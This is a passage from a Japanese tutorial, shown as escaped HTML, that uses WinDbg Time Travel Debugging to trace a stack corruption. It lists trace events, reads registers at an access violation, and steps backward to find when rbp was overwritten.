&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; dx &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;r1 @&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events
@&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events                
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x0&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module ttd_tutorial&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe Loaded at position: 2:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x1&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module TTDRecordCPU&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Loaded at position: 3:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x2&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module apphelp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Loaded at position: 4:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x3&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module KERNELBASE&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Loaded at position: 5:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module ucrtbase&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Loaded at position: 6:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x5&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module KERNEL32&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DLL Loaded at position: 7:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x6&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Loaded at position: 8:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x7&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Thread UID:   2 TID: 0x1F9C created at D:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Exception 0xC0000005 of &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt; Hardware at PC: 0X52005400200045
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x9&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Thread UID:   2 TID: 0x1F9C terminated at 96:1
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xa&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module apphelp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xb&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module TTDRecordCPU&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xc&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module ttd_tutorial&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xd&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module KERNEL32&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;DLL Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xe&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module KERNELBASE&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0xf&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;            : Module ntdll&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Unloaded at position: FFFFFFFFFFFFFFFE:0
    &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;0x10&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;           : Module ucrtbase&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;dll Unloaded at position: FFFFFFFFFFFFFFFE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;例外の詳細を取得する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BE%8B%E5%A4%96%E3%81%AE%E8%A9%B3%E7%B4%B0%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;例外の詳細を取得する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;例外の詳細を取得する&lt;/h3&gt;
&lt;p&gt;例外のイベントをクリックして詳細を表示したところ、例外発生時の&lt;code class=&quot;language-text&quot;&gt;Time Travel Position&lt;/code&gt;が&lt;code class=&quot;language-text&quot;&gt;7C:0&lt;/code&gt;であることがわかりました。（ポジションは実行環境によって変わる可能性があります。）&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; dx &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;r1 @&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
@&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;                 : Exception 0xC0000005 of &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt; Hardware at PC: 0X52005400200045
    &lt;span class=&quot;token function&quot;&gt;Type&lt;/span&gt;             : Exception
    Position         : 7C:0 &lt;span class=&quot;token namespace&quot;&gt;[Time Travel]&lt;/span&gt;
    Exception        : Exception 0xC0000005 of &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt; Hardware at PC: 0X52005400200045&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、子要素の[Exception]を選択することで、さらに詳細な例外の情報も取得することができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; dx &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;r1 @&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception
@&lt;span class=&quot;token variable&quot;&gt;$curprocess&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TTD&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Events&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;8&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Exception                 : Exception 0xC0000005 of &lt;span class=&quot;token function&quot;&gt;type&lt;/span&gt; Hardware at PC: 0X52005400200045
    Position         : 7C:0 &lt;span class=&quot;token namespace&quot;&gt;[Time Travel]&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;Type&lt;/span&gt;             : Hardware
    ProgramCounter   : 0x52005400200045
    Code             : 0xc0000005
    Flags            : 0x0
    RecordAddress    : 0x0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;例外が発生したタイミングにジャンプする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BE%8B%E5%A4%96%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%9F%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AB%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E3%81%99%E3%82%8B&quot; aria-label=&quot;例外が発生したタイミングにジャンプする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;例外が発生したタイミングにジャンプする&lt;/h3&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;7C:0 [Time Travel]&lt;/code&gt;をクリックして、例外が発生した位置にジャンプします。&lt;/p&gt;
&lt;p&gt;画面下部の[Timelines]のカーソルの位置が進みました。&lt;/p&gt;
&lt;p&gt;TTDでは、現在の&lt;code class=&quot;language-text&quot;&gt;Time Travel Position&lt;/code&gt;でトレースされたメモリやレジスタの情報を参照することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/8e3bc7f6f574ab989430b7790e7ea787/0b533/image-34.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACEklEQVQ4y42T6Y6bQBCEef83SqLdfYD8sr0cNubwcuMZrsGcxpWesUUix5EyUqlhYD6qq4X27SeDHZxhWRY2Ox26YeGTFMYpeFkhZwV4UaHreozjiCTJIMQF1+sV8zyTrpimGctyQ0Xva/5RoKBDpqFjt9thu91A13X4nocwDFEUBdr2gtttoUMLXNqfpgmvlmgENNOskGaMHBowCGoYJkzTUI5t+wjGmHIkYRKU52eC3/6SXE3TQHPcDlF0wemUI05KVFWpIJzz1V3bduqQBDLGV8BzVUDDzMlJhu3mBNNKFYTToSzLlKQjIVrlUObmuB6GYXgJlDlrvu9QLgdq8ZMy8xHFAcLoi0AZfbFGSUELIVag55/UcF4B+2GCZh8dmuweB9snYIAgOBGUgOec2heqjYbClu1KoEvA4V/AfoQWhIwyLOB5CTnjSFKGsqpQNy3VTrUhHUpXK3D4DfxzKA+gdEVtBiHSNEYch6SYcqTs6pJUoSWghMm2j467tvy8FDD9ihDyFnZSw0kbuJlYZScN9nGNIOVq2pdLhzPjaup9P9B9Tx3c6zhOlHcNTfASUdnimNaw0wpmxHCISzhZjT1FsafrtBCYyeEo/wjqbpoXjPP9fnrUmR70FIV2N3t7aAaWjqr8E5bHHu77/7UWaN+NHG97jrdDgXfSh12q+vbQ+6HED5Ph/h5bnz9L7n9YOX4Bc+/a8n94GSYAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/8e3bc7f6f574ab989430b7790e7ea787/8ac56/image-34.webp 240w,
/static/8e3bc7f6f574ab989430b7790e7ea787/d3be9/image-34.webp 480w,
/static/8e3bc7f6f574ab989430b7790e7ea787/b0a15/image-34.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/8e3bc7f6f574ab989430b7790e7ea787/8ff5a/image-34.png 240w,
/static/8e3bc7f6f574ab989430b7790e7ea787/e85cb/image-34.png 480w,
/static/8e3bc7f6f574ab989430b7790e7ea787/0b533/image-34.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/8e3bc7f6f574ab989430b7790e7ea787/0b533/image-34.png&quot;
            alt=&quot;image-34.png&quot;
            title=&quot;image-34.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;WinDbgでは、&lt;code class=&quot;language-text&quot;&gt;p&lt;/code&gt;コマンドでレジスタの情報を参照できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;Time Travel Position: 7C:0
0:000&gt; r
rax=0000000000000000 rbx=0000000000000001 rcx=00000000ffffffff
rdx=00007ffdef6e0980 rsi=000002b36fa33520 rdi=000000000000002c
rip=0052005400200045 rsp=000000b936effb20 &lt;span class=&quot;token function&quot;&gt;rbp&lt;/span&gt;=004d004900540020
 r8=000000b936efde98  r9=000002b36fa3899c r10=0000000000000000
r11=000000b936eff980 r12=0000000000000000 r13=0000000000000000
r14=000002b36fa2d110 r15=0000000000000001
iopl=0         &lt;span class=&quot;token function&quot;&gt;nv&lt;/span&gt; up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
00520054`00200045 ??              ???&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のように、&lt;code class=&quot;language-text&quot;&gt;rsp&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;rbp&lt;/code&gt;レジスタの値が大きく異なる場合、何らかの理由でスタックが破壊されている可能性があります。&lt;/p&gt;
&lt;h3 id=&quot;step-into-back&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#step-into-back&quot; aria-label=&quot;step into back permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Step Into Back!!!&lt;/h3&gt;
&lt;p&gt;ここから、スタックが破壊されたタイミングを特定するために、時間を戻します。&lt;/p&gt;
&lt;p&gt;画面の通り[Step Into Back]ボタンをクリックすることで、1つずつトレース位置を戻すことができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 852px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/12d497b36084dbe911d3bc61dcac5f79/47ff6/image-37-852x1024.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 120%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAARlAAAEZQAGA43XUAAAD3UlEQVQ4y4VU2ZLiRhDUj/vZz/4F+wP8YIftxTG7MTjwBnMxMAgY0AFCAh3oPkAtIF3VGJZd76wVkVF9qTq7KquU7290vB+pWFpraJoF/VXDjK3lQJtpWK0CrBwXI9PFfG7jaWLjlweyeoil48N2Q1i2j2CTIIpSKNt4A3OuwppbmP35AeMff4LR/huG4UCfGlivfXhrD+3+HFNjifHMwu2Thle6oMpzpHGKPMnIJnKs/PBhge9+1fBedREFdOvSheN48OhG14/hBTH8IMHKC+HTWhxniMIIMbEJwhQbshuyYZTBpTNKV9Xw7uMzPvaG0BdLPA5U9IZjjKY6XsZTdLr36Nw9IspKiCNQicNXsMe2OSKIcyj2wqSnTWDqGqzFHCN1iOfnHkzTJCYbiqED3/cgRI2mETjsG7z1bbc7KJqmwVmt6Kk2gmCDNM3oCRtkFJ9qu0VdC3lYCEHPjZEXBfaHAznfY78/QY4PexRFBWU8HkPXdXJoIQwLZJmgmypUVYXdbkfj7WVcE8u6ruUaz884z7OsgGIYBhYLC5a1oIxG9DPo1gYN3Xw8Hi84MWkurL7E4czw5eUFzHIymcC2bWK6BF9iOw5dsCbtzeU4SVL6oUBOofgaeC8h+SicgHa7jW63i8FggNvbW5r/hfv7B7nWarVwc3NDlzkU35TEG1FoQmnPCEO2IdkYypAYPj4+ot/vg9ne3d2h0+nIMbObzWYy455PAvc8yrgvk3Pt8JPjhBySTDjT/GROjue68un8cxAEkk1ZltKJQ0/ndWaaJMlnSNN/S09VVUynM4qbDnvp0+YOZfEpLtdxO4+zLPsPeJ2r6CIbxnpN5RfFcInlmR0zY0bMkuXzFlg6aUqyYUf9/gCj0VhqkRPD8dM0HRO6jBPz1OvJn/7vK8stFNM0KH6vUirWYiGd9ciBYZgyXpyQOa1zWZEcSW+Hz/R5Bn9S2PO5SfW6ImFbMuicLXaUJLFkxWLm70iOkjj+JtM8o+bgU6yCTUiyCOQNguqyqnYoyorqlmKzq6mmubxqKi8h54xaNIT9BaI5IOJ+OBlNqafliNJSWj/MLgi+mF9jExeEUtogKqh/pnDWAZTw4VkKcmBF+F310Rr5eHeF1hWu1/5QPfzcW8nxb0MXnakn5aNU1FlYlNyqkpzqMS8lUmkLaqwZ4jRHQuFIr/doviZGfCYtSkRUx9zqFG5H3OsE2UbUspHKZkqbO7GFm6yxoTjneUb7p3Pick5cGm9ZVqcGyzKQoNSfJcGZPR0W5KQ5zRtOgpD98Pr8+Z/drpZQON3nXvcmRPPtfVIGP7eqtvgHh9kNveAdOTUAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/12d497b36084dbe911d3bc61dcac5f79/8ac56/image-37-852x1024.webp 240w,
/static/12d497b36084dbe911d3bc61dcac5f79/d3be9/image-37-852x1024.webp 480w,
/static/12d497b36084dbe911d3bc61dcac5f79/39392/image-37-852x1024.webp 852w&quot;
              sizes=&quot;(max-width: 852px) 100vw, 852px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/12d497b36084dbe911d3bc61dcac5f79/8ff5a/image-37-852x1024.png 240w,
/static/12d497b36084dbe911d3bc61dcac5f79/e85cb/image-37-852x1024.png 480w,
/static/12d497b36084dbe911d3bc61dcac5f79/47ff6/image-37-852x1024.png 852w&quot;
            sizes=&quot;(max-width: 852px) 100vw, 852px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/12d497b36084dbe911d3bc61dcac5f79/47ff6/image-37-852x1024.png&quot;
            alt=&quot;image-37-852x1024.png&quot;
            title=&quot;image-37-852x1024.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Time Travel Position: 7B:17&lt;/code&gt;の時点では正常であった&lt;code class=&quot;language-text&quot;&gt;rbp&lt;/code&gt;レジスタの値が、&lt;code class=&quot;language-text&quot;&gt;Time Travel Position: 7B:18&lt;/code&gt;のタイミングで破損したことが推察できます。&lt;/p&gt;
&lt;h3 id=&quot;bspの指すアドレスのメモリデータを参照する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#bsp%E3%81%AE%E6%8C%87%E3%81%99%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B&quot; aria-label=&quot;bspの指すアドレスのメモリデータを参照する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;BSPの指すアドレスのメモリデータを参照する&lt;/h3&gt;
&lt;p&gt;スタックが破壊される直前にBSPが保持していたアドレス情報が、&lt;code class=&quot;language-text&quot;&gt;0xb936effb00&lt;/code&gt;であることが確認できました。&lt;/p&gt;
&lt;p&gt;次は、このBSPが示すメモリアドレスの情報を表示してみます。&lt;/p&gt;
&lt;p&gt;WinDbgの[View]から、memoryウィンドウを開き、アドレスバーに&lt;code class=&quot;language-text&quot;&gt;0xb936effb00&lt;/code&gt;を入力します。&lt;/p&gt;
&lt;p&gt;このとき、[Memory]タブの[Text]の設定項目を[none]から[ASCII]に変更することで、メモリデータ内の文字列を表示させることができるようになります。&lt;/p&gt;
&lt;p&gt;以下の画像のように、BSPの指すアドレスにはどうやら文字列が格納されていることがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/9622b7e84612443b9124da99e3025e1e/2bef9/image-38-1024x568.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAACCElEQVQoz4VSy5KbMBDk/78kp+yecs05lWzs2CCEhHhJgME2mIfBXh86I3krqcolh64eGM2rZ7wv33zwRGMnNLpzj+Pxibbt0XeDw+l4cTz043/hcV9ApkdseEGBE04ncgwzpnHGV1bj03eDl02Nz9uDw+uvBi//4HXX/oEnZYa6OsHoEhVx308YxxGPxwNcxGCRRFoYpNogozcWuqqRmwpJrsk+YJgXwhXX2zu8zc89OI8RhjHiOEOWlTg0LS6XC1jAEHEOFZNPSihl30j3LYRwti4KmmbEOAy43VZ4+32IPC+RZgZaH1DXJ0zTTM47FeKQ8hmUpin5C3qbOagkcVwaQ+8nzPNEMTd4PiXUukaWGxhTo2nPuF4XN3LAOFjIqVgBGSvEKoWQijp9spAxkiRDVTcoafTLQEsRUQ5Tnqlai5aW0nULJVyxrgv8gGO3Z5RUOAQsIpYftnD+SChKeISpGpJpoi2HtJT6grLs0DQjYSLHSCPMYCyksUMaW7jRrWaW7bfVUBKsDFa7dV3xfr/De3v7Qc7I6eX7e2dvtxuMpIsQ0gUqpRxiWoblLHtqaL+11liWxenoNAwZcz8LEt5y3/euuztVC4Lgo8Nn4iiKHNui1g5D5pLb7iweDzqbiO7sfO5ozIGqXOkGJ3Le3GHzSLgulUpoyzkF/0VKsAsxpnRXYWGX+RvmiiSvmi5QuAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/9622b7e84612443b9124da99e3025e1e/8ac56/image-38-1024x568.webp 240w,
/static/9622b7e84612443b9124da99e3025e1e/d3be9/image-38-1024x568.webp 480w,
/static/9622b7e84612443b9124da99e3025e1e/e46b2/image-38-1024x568.webp 960w,
/static/9622b7e84612443b9124da99e3025e1e/a9a89/image-38-1024x568.webp 1024w&quot;
              sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/9622b7e84612443b9124da99e3025e1e/8ff5a/image-38-1024x568.png 240w,
/static/9622b7e84612443b9124da99e3025e1e/e85cb/image-38-1024x568.png 480w,
/static/9622b7e84612443b9124da99e3025e1e/d9199/image-38-1024x568.png 960w,
/static/9622b7e84612443b9124da99e3025e1e/2bef9/image-38-1024x568.png 1024w&quot;
            sizes=&quot;(max-width: 960px) 100vw, 960px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/9622b7e84612443b9124da99e3025e1e/d9199/image-38-1024x568.png&quot;
            alt=&quot;image-38-1024x568.png&quot;
            title=&quot;image-38-1024x568.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
